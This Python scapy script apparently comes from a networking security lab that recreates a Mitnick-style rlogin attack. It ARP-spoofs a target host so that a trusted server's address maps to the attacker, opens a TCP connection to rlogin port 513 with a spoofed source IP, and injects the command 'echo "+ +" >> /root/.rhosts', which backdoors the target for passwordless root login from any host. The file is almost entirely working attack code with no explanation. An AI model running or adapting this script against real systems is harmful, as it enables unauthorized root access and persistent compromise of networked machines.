from threading import Thread
from time import sleep
import scapy.all as scapy
import os

SPOOF_DELAY = 2

attacker_ip       = '10.9.0.1'
x_terminal_ip     = '10.9.0.5'
trusted_server_ip = '10.9.0.6'
attacker_mac      = scapy.get_if_hwaddr('br-1a83e0f2eaca')

client_username = "root"
server_username = "root"
terminal_info   = "xterm/38400"

stop_spoofing = False

def tcp_three_way_handshake(target_ip, target_port, source_ip, source_port):
  # Step 1: Send SYN packet
  syn_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="S", seq=1000)
  print(f"[*] Sending SYN packet from {source_ip}:{source_port} to {target_ip}:{target_port}")
  syn_ack_packet = scapy.sr1(syn_packet, timeout=1, verbose=False)

  # Check if we received a SYN-ACK
  if syn_ack_packet and syn_ack_packet.haslayer(scapy.TCP) and syn_ack_packet[scapy.TCP].flags == "SA":
    print("[*] Received SYN-ACK packet")

    # Step 2: Send ACK packet
    ack_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="A", seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1)
    scapy.send(ack_packet, verbose=False)
    print("[*] Sent ACK packet")

    # At this point, the TCP three-way handshake is complete
    print("[*] TCP three-way handshake completed successfully")

    # Constrói o pacote TCP com o payload
    payload = b"\x00" + client_username.encode() + b"\x00" + server_username.encode() + b"\x00" + terminal_info.encode() + b"\x00"
    rlogin_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="PA", seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1) / scapy.Raw(load=payload)
  
    # Envia o pacote e recebe a resposta
    rlogin_response_packet = scapy.sr1(rlogin_packet, timeout=1, verbose=False)
    if rlogin_response_packet and rlogin_response_packet.haslayer(scapy.TCP) and rlogin_response_packet[scapy.TCP].flags == "A" and rlogin_response_packet.haslayer(scapy.Raw) == 0:
      print("Rlogin connection established successfully.")

      payload = 'echo "+ +" >> /root/.rhosts\r'.encode()
      packet  = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="PA", seq=rlogin_response_packet.ack, ack=rlogin_response_packet.seq + 1) / scapy.Raw(load=payload)
      response = scapy.sr1(packet, timeout=1, verbose=False)

      response.show()

      # ack_packet = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="A", seq=response.ack, ack=response.seq + 1)
      # response = scapy.sr1(ack_packet, timeout=1, verbose=False)

      # send ack for rlogin response packet
      # ack_packet            = scapy.IP(src=source_ip, dst=target_ip) / scapy.TCP(sport=source_port, dport=target_port, flags="A", seq=rlogin_response_packet.ack, ack=rlogin_response_packet.seq + 1)
      # login_packet_response = scapy.sr1(ack_packet, timeout=1, verbose=False)

      # if login_packet_response and login_packet_response.haslayer(scapy.TCP) and login_packet_response[scapy.TCP].flags == "PAU": 
      #   print("Successfully logged in server")
    else: 
      print("Failed to establish rlogin connection or invalid response.")
  else:
    print("[!] SYN-ACK packet not received. Handshake failed.")

def spoof(): 
  packet = scapy.ARP(op=1, 
                     pdst=x_terminal_ip,
                     psrc=trusted_server_ip, 
                     hwsrc=attacker_mac)
  scapy.send(packet, verbose=False)

def spoof_loop():
  while not stop_spoofing:
    spoof()
    sleep(SPOOF_DELAY)


def batata():
  global stop_spoofing

  spoof() # ensure spoof is done
  tcp_three_way_handshake(x_terminal_ip, 513, trusted_server_ip, 1023)

  stop_spoofing = True

def disable_ip_forward(): 
  os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def disable_send_redirects(): 
  os.system('echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects')

def setup_attacker_env():
  disable_ip_forward()
  disable_send_redirects()

setup_attacker_env()

spoof_thread  = Thread(target=spoof_loop)
batata_thread = Thread(target=batata)

spoof_thread.start()
batata_thread.start()

spoof_thread.join()
batata_thread.join()
